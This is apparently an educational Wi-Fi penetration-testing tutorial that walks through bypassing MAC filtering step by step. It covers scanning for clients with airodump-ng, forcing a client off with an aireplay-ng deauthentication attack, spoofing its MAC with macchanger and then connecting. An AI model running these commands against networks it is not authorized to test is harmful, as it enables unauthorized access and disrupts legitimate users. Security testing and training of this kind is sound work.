# Wi-Fi Pentesting Chain #9: Bypassing MAC Filtering

MAC filtering is a weak access control method where only devices with approved MAC addresses are allowed to connect. Since MAC addresses can be spoofed, this control can be bypassed.

---

## Step 1: Identify Target Network and Clients

1. Put your interface into monitor mode if it’s not already:
   ```bash
   sudo airmon-ng start wlan0
   ```

2. Use `airodump-ng` to scan for networks and associated clients:
   ```bash
   sudo airodump-ng wlan0mon
   ```

   **What you’re looking for:**
   - Target **BSSID** (the AP’s MAC address).
   - **ESSID** (network name).
   - **Client MAC addresses** (STATION field).

   **Diversion:**
   - If you see **no clients connected**, MAC spoofing won’t help unless you know an allowed MAC address. You may have to wait until a client connects.

---

## Step 2: Select a Client MAC Address to Imitate

- Pick one of the connected client MACs.
- Note that if you spoof an address that is still connected, you’ll cause **MAC collisions**, which may:
  - Disrupt both connections.
  - Trigger suspicion.

**Better approach:**
- Wait until the client disconnects naturally.
- Or force the client to disconnect using a **deauthentication attack**:
  ```bash
  sudo aireplay-ng -0 5 -a <BSSID> -c <Client_MAC> wlan0mon
  ```

---

## Step 3: Spoof Your MAC Address

1. Stop monitor mode to work with a managed interface:
   ```bash
   sudo airmon-ng stop wlan0mon
   ```

2. Check your current MAC address:
   ```bash
   sudo macchanger -s wlan0
   ```

3. Change your MAC address to the client’s MAC:
   ```bash
   sudo ifconfig wlan0 down
   sudo macchanger wlan0 -m <Client_MAC>
   sudo ifconfig wlan0 up
   ```

4. Verify the change:
   ```bash
   ifconfig wlan0
   ```

---

## Step 4: Connect to the Network

- Now that your MAC matches an authorized client, connect normally with the password:
  ```bash
  sudo wpa_supplicant -c wpa.conf -i wlan0 &
  sudo dhclient wlan0
  ```

**Diversion:**
- If the AP also has a **5 GHz band** with no active clients, spoof a client’s MAC from 2.4 GHz but connect to 5 GHz. This avoids collisions.

---

## Step 5: Confirm Successful Connection

- Check that you have an IP:
  ```bash
  ifconfig wlan0
  ```
- Verify connectivity with ping:
  ```bash
  ping -c 4 8.8.8.8
  ```

If successful, you’ve bypassed MAC filtering.